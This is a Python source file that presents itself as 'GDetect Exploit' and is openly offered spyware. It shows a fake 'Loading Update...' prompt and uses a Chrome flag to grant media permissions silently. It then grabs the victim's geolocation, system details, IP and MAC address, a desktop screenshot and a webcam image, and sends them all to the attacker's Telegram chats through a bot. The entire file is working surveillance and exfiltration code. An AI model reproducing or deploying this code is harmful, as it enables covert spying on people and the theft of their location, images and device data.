##########################################################################################################
#   _____   _____           _                   _           ______                  _           _   _    #
#  / ____| |  __ \         | |                 | |         |  ____|                | |         (_) | |   #
# | |  __  | |  | |   ___  | |_    ___    ___  | |_        | |__    __  __  _ __   | |   ___    _  | |_  #
# | | |_ | | |  | |  / _ \ | __|  / _ \  / __| | __|       |  __|   \ \/ / | '_ \  | |  / _ \  | | | __| #
# | |__| | | |__| | |  __/ | |_  |  __/ | (__  | |_        | |____   >  <  | |_) | | | | (_) | | | | |_  #
#  \_____| |_____/   \___|  \__|  \___|  \___|  \__|       |______| /_/\_\ | .__/  |_|  \___/  |_|  \__| #
#                                                                          | |                           #   
#                                                                          |_|                           #
#                 ____               _____                  ___    ____     ___    ____                  #
#                |  _ \             / ____|                |__ \  |___ \   / _ \  |___ \                 #
#                | |_) |  _   _    | |  __   _ __   _   _     ) |   __) | | | | |   __) |                #
#                |  _ <  | | | |   | | |_ | | '__| | | | |   / /   |__ <  | | | |  |__ <                 #
#                | |_) | | |_| |   | |__| | | |    | |_| |  / /_   ___) | | |_| |  ___) |                #
#                |____/   \__, |    \_____| |_|     \__,_| |____| |____/   \___/  |____/                 #
#                          __/ |                                                                         #
#                         |___/                                                                          #
##########################################################################################################


# Why comment if the code works. :D

# Зачем комментировать, если код работает. :D


# Settings for 164 lines


from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from tkinter import messagebox
from PIL import ImageGrab
import wmi, time, tkinter, requests, uuid, re, json, os, cv2, telepot

def checkInternet():
    try:
        requests.get('http://216.58.192.142')
    except requests.ConnectionError :
        return  False
    return  True    

def infMessageBox(msg) :
    root = tkinter.Tk()
    root.withdraw()
    messagebox.showinfo('Information', msg)   

def dialogMessageBox(title, msg, icn = 'warning') :
    MsgBox = tkinter.messagebox.askquestion (title, msg, icon = icn)
    if MsgBox == 'yes':
       return True
    else:
        return False

def getLocation() :

    def mainDef() :
        try :
            return (startProgramm())
        except :
            if dialogMessageBox('Warning', 'You have closed the browser. Do you want to continue downloading the update?', 'warning') :
                return  (mainDef()) 
            else :
                exit(1) 

    def startProgramm() :
        options = getOptions()
        driverBrowser = startBrowser(options)
        executeJS(driverBrowser)
        time.sleep(2.5)

        return (getCoords(driverBrowser))

    def getOptions() :
        options = Options()
        options.add_argument('--use-fake-ui-for-media-stream')

        return  options

    def startBrowser(options) :  
        driver = webdriver.Chrome(executable_path = './chromedriver.exe', chrome_options=options)
        driver.get('http://216.58.192.142') 
        infMessageBox('Loading Update...')

        return  driver

    def executeJS(driver)  : 
        js = open('js.js', 'r+').read()
        driver.execute_script(js)
        wait = WebDriverWait(driver, 20)

        return (1)

    def getCoords(driver) :
        coords = driver.find_element_by_id('res').text
        driver.quit()

        return (coords)

    return (mainDef())  

def getSystemInfo() :

    def mainDef() :
        info = {}
        info['OS Name'] = getOSName()
        info['OS Version'] = getOSVerion()
        info['CPU'] = getCPU()
        info['RAM'] = getRAM()
        info['Graphics Card'] = getGraphicsCard()
        info['ip-address'] = getIP()
        info['mac-address'] = getMAC()

        return (info)

    def getOSName() :
        return (format(wmi.WMI().Win32_OperatingSystem()[0].Name.encode('utf-8').split(b'|')[0]))

    def getOSVerion() :
        return (format(' '.join([wmi.WMI().Win32_OperatingSystem()[0].Version, wmi.WMI().Win32_OperatingSystem()[0].BuildNumber])))

    def getCPU() :
        return (format(wmi.WMI().Win32_Processor()[0].Name))

    def getRAM() : 
        return (format(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576))

    def getGraphicsCard() :
        gpu_info = []
        for i in range(len(wmi.WMI().Win32_VideoController())) :
            gpu_info.append(format(wmi.WMI().Win32_VideoController()[i].Name))

        return (gpu_info)   

    def getIP() :
        return (requests.get('https://get.geojs.io/v1/ip.json').json()['ip'])

    def getMAC() :
        return (':'.join(re.findall('..', '%012x' % uuid.getnode())))

    return (mainDef())

def getScreenShot() :
    save_path = os.environ['appdata'] + '\\ScreenShot.jpg'
    snapshot = ImageGrab.grab()
    snapshot.save(save_path)

    return (save_path)

def getScreenShotWebCam() :
    save_path = os.environ['appdata'] + '\\ScreenShotWebCam.jpg'
    camera = cv2.VideoCapture(0)
    for i in range(10):
        return_value, image = camera.read()
        if i == 9 :
            cv2.imwrite(save_path, image)
    del(camera)

    return (save_path) 

if __name__ == '__main__' :

    if checkInternet() == False :
        infMessageBox('Not internet connetion')
        exit(0)

    telegram_users_chat_ID = ['000000000', '000000001', '000000002'] #Your telegram chatID
    bot = telepot.Bot('TOKEN') # bot TOKEN

    systemInfo = getSystemInfo()
    coords = getLocation()
    dirScreenShot = getScreenShot()
    dirScreenShotWebCam = getScreenShotWebCam()

    for i in range(len(telegram_users_chat_ID)) :
        bot.sendMessage(telegram_users_chat_ID[i], systemInfo)
        bot.sendMessage(telegram_users_chat_ID[i], 'Coords: ' + coords)
        bot.sendMessage(telegram_users_chat_ID[i], 'https://www.google.com/maps/place/' + coords.split(', ')[0] + '+' + coords.split(', ')[1])
        bot.sendDocument(telegram_users_chat_ID[i], open(dirScreenShot, 'rb'))
        bot.sendDocument(telegram_users_chat_ID[i], open(dirScreenShotWebCam, 'rb'))
        bot.sendMessage(telegram_users_chat_ID, 'Bot by Gru2303')

